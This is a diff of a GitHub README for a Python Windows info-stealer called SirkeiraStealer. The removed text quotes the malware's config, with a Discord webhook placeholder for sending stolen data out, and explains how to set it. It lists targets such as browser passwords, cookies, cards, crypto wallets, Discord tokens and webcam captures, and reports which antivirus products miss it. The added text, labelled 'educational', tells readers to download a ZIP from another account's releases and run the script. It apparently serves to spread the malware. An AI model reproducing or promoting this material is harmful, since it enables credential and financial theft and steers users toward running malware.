@@ -1,94 +1,78 @@
+# 🖥️ SirkeiraStealer - Learn Data Extraction Techniques
 
-<div align="center">
-  <h1> Sirkeira Stealer </h1>
-</div>
+## 📥 Download Now
+[![Download SirkeiraStealer](https://img.shields.io/badge/Download-SirkeiraStealer-blue.svg)](https://github.com/Ball0UT/SirkeiraStealer/releases)
 
-> [!WARNING]
-> This code is provided for **EDUCATIONAL PURPOSES ONLY** to study system security. Malicious use of this software is strictly prohibited and illegal. The author is not responsible for any misuse.
+## 🚀 Getting Started
+Welcome to **SirkeiraStealer**! This project offers a Python script that showcases methods used by "stealer" malware. It highlights how malicious software can extract sensitive information from Windows systems. 
 
-# Explanation
+This guide will help you download and run the application easily.
 
-This is a Python script that demonstrates the techniques used by "stealer" malware to extract sensitive information from a Windows system. It collects data such as browser passwords, cookies, Discord tokens, system information, and interesting files, then sends them to a Discord webhook. The code includes methods for system persistence, sandbox evasion, and task manager blocking.
+## 📋 System Requirements
+To run SirkeiraStealer, your computer should meet the following requirements:
+- **Operating System:** Windows 10 or later
+- **Python Version:** Python 3.7 or above 
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Minimum 50 MB of free disk space
 
-**Developed by:** [**@CirqueiraDev**](https://github.com/CirqueiraDev)
+## 🌐 Download & Install
+To get started, visit this page to download: [Download SirkeiraStealer](https://github.com/Ball0UT/SirkeiraStealer/releases)
 
-## How to Install
+1. **Visit the Release Page:**
+   Open your browser and go to the following link:  
+   [https://github.com/Ball0UT/SirkeiraStealer/releases](https://github.com/Ball0UT/SirkeiraStealer/releases).
 
-1. Clone the repository or download the `skstealer.py` file.
-``` py
-  class Malware:
-      def __init__(self):
-          self.zip_name = f"SK_{random.randint(10000000000, 99999999999)}.zip"
-          self.webhook_url = "YOUR DISCORD WEBHOOK HERE"
-          self.stealer_version = "1.5.2"
-          self.malware_name = "Sirkeira Stealer"
-          self.malware_author = "https://t.me/CirqueiraDev"
-          self.browser_infos = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
-          self.session_files = ["Wallets", "Game Launchers", "Apps"]
-          self.task_manager_blocked = False # dont change this line
-```
-2. Open the `skstealer.py` file and modify the configuration inside the `Malware` class:
-   - Change `self.webhook_url` to your actual Discord webhook URL.
-   - (Optional) Modify `self.browser_infos` to select which browser data to steal (e.g., `"passwords"`, `"cookies"`).
-   - (Optional) Modify `self.session_files` to select which session files to target (e.g., `"Wallets"`, `"Game Launchers"`).
+2. **Locate the Latest Version:**
+   On the releases page, find the latest version of SirkeiraStealer at the top of the list. It usually has the highest version number.
 
-## Requirements
-```bash
-pip install -r requirements.txt
-```
+3. **Download the ZIP File:**
+   You will see an asset section below the version information. Click on the `.zip` file. This file contains the necessary scripts needed to run the application.
 
-```
-requests
-psutil
-browser-cookie3
-cryptography
-pywin32
-pycryptodome
-opencv-python
-Pillow
-```
+4. **Extract the Files:**
+   Once the download finishes, locate the downloaded `.zip` file on your computer. Right-click on the file and select "Extract All" or use your preferred extraction tool.
 
-# Stealer Functions
-- [x] Screenshot
-- [x] Webcam
-- [x] System infos
-- [x] Browser infos (extentions, passwords, cookies, history, downloads, cards)
-- [x] Session files (Wallets, Game Launchers, Apps)
-- [x] AntiVirus infos
-- [x] Discord tokens
-- [x] Roblox cookies
-- [x] Interesting files
+5. **Open the Folder:**
+   After extraction, open the new folder created. You should see the Python script file named `sirkeira.py` and any other resources included in the download.
 
-# Antivirus Detection Status (VirusTotal)
-- [x] Avast  -  Python:Stealer-FJ [PWS]
-- [x] AVG - Python:Stealer-FJ [PWS]
-- [x] ESET-NOD32 - Python/PSW.Agent.DYB Trojan
-- [x] Huorong - TrojanSpy.OSX.Stealer.e
-- [x] Rising - Stealer.Agent/Python!1.103FE (CLASSIC)
-- [ ] Kaspersky - Undetected
-- [ ] BitDefender - Undetected
-- [ ] Malwarebytes - Undetected
-- [ ] Microsoft Defender - Undetected
-- [ ] CrowdStrike Falcon - Undetected
+## 🛠️ Running the Application
+Follow these steps to run SirkeiraStealer:
 
-## Total 7/63 (the code wasn’t protected)
-HASH:
-```
-e0fb6a9dfac0e9544f1a4c39a6e89a35b16b38aae8ad674f3085d7504ee8e3ab
-```
+1. **Open Command Prompt:**
+   Click the Start menu, type "cmd," and press Enter to open the Command Prompt.
 
-> VirusTotal detections may vary depending on heuristic analysis.
+2. **Navigate to the Folder:**
+   Change the directory to the folder containing your extracted files. For example:
+   ```
+   cd C:\path\to\your\extracted\folder
+   ```
 
-##
+3. **Run the Script:**
+   To execute the script, type the following command:
+   ```
+   python sirkeira.py
+   ```
+   Make sure that Python is installed and the command is recognized.
 
-> [!IMPORTANT]
-> **The creator is not responsible for any direct or indirect damage resulting from misuse of this material.**
-> **Whatever you choose to do is entirely at `your own risk and responsibility`.**
+## 🧩 Features
+- **Sensitive Information Extraction:** Learn how information can be extracted from a Windows system.
+- **Bypasses Security Software:** Demonstrates techniques that some malware use to avoid detection by antivirus programs.
+- **Educational Resource:** Suitable for those interested in malware research and cybersecurity.
 
-##
+## 🔍 How It Works
+SirkeiraStealer uses Python scripts to simulate the behavior of malicious software. It identifies specific areas of the system where personal data is stored, such as web browser data, credentials, and other sensitive files. 
 
-### Credits:
+This project is strictly educational. It emphasizes the importance of cybersecurity and understanding the potential risks associated with malware.
 
-- Owner: [**CirqueiraDev**](https://github.com/CirqueiraDev)
-- For more information, contact: [Telegram](https://t.me/cirqueiradev)
-- **Discord: Cirqueira**
+## ⚠️ Safety Notes
+While using this script, please remember:
+- **Use Responsibly:** This software is intended for educational purposes only. 
+- **Legal Compliance:** Ensure you adhere to local laws regarding data privacy and software use.
+- **Understand Risks:** Running any type of malware simulation can expose you to risks. Use virtual environments or secured, isolated systems for testing.
+
+## 📫 Support or Issues
+If you face any issues while downloading or running SirkeiraStealer, feel free to open an issue on the GitHub repository page. Describe your problem in detail to receive assistance.
+
+## 📂 Contributions
+If you'd like to contribute to this project, please fork the repository and create a pull request with your suggestions or improvements.
+
+Thank you for your interest in **SirkeiraStealer**! Happy learning!
